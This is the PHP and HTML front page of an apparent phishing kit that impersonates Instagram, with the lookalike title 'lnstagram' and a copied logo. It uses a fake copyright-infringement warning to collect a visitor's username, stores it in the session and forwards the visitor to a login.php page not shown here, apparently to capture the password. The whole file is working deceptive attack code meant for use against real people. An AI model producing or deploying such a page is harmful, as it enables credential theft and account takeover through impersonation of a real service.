<?php
if ($_GET) {
	$username=$_GET["username"];
	session_start();
	$_SESSION["username"]=$username;
	header("location: login.php?username=$username");
}


?>
<!DOCTYPE html>
<html>
<head>
    <title>Copyright • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://i.resimyukle.xyz/PyRHaN.jpg">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<body style="background:#fafafa;">
<?php
include("anil/anilcss/index.php")
?>
<style>
#_an1l{
  width: 100%;
  text-align: center;
  padding-top: 20px;
  position: fixed;
  background-color: #ffffff;
  top: 0px;
  left: 0px;
  height: 85px;
  border-bottom: 2px solid #dbdbdb;
}
#formyre{
  width: 100%;
  text-align: center;
  padding-top: 20px;
  position: fixed;
  background-color: #ffffff;
  top: 0px;
  left: 0px;
  height: 85px;
  border-bottom: 2px solid #dbdbdb;
}
#govd{width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;
}
#anilqwe{
background-color:white;
width:300px;
max-width:1000%;
margin-top: 150px;
padding:200px;
box-sizing:border-box;
border:2px solid #cecece;
}
</style>


		<br>
	<center><br><br><br><div style="width:400px;max-width:1000%;background:white;border:1px solid #cecece;padding-top: 20px;height:400px;">
			<br>
			<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSv3GysrPLnBI6OO1TdqqIek9ntr_DyyqOAMQ&usqp=CAU" width="170"><br>
			<p style="font-family:sans-serif;width:500px;max-width:88%;color:#999;font-size:15px;line-height:20px;">Hello, please proceed by entering the username to remove copyright infringements on your account.</p><br>
		
			<form method="get" >
			<input class="anilbuton" type="text" name="username" placeholder="Username" required="" style="padding:6px; 
    background:#fafafa; 
    outline:none;
    width:250px; 
    height:30px; 
    border:5px solid #dedede; 
    font-family:sans-serif; 
    font-weight:350;
    flex: 1 0 0px;
    margin: 0;
    outline: 0;
    overflow: hidden;
    padding: 9px 0 7px 8px;
    text-overflow: ellipsis;
    border: 1px solid #e6e6e6;    
    text-overflow: ellipsis;
    font: 400 13.3333px Arial; 
    border-radius:3px;">
			<br><br><br>
			<button type="buton" style="color:white; width:80%; outline:0; border:0; border-radius:3px;background: #3897f0;border-color: #3897f0;    font-size: 14px; font-weight:bold; height:33px;width:250px;" >Next
		 </button>
			</center>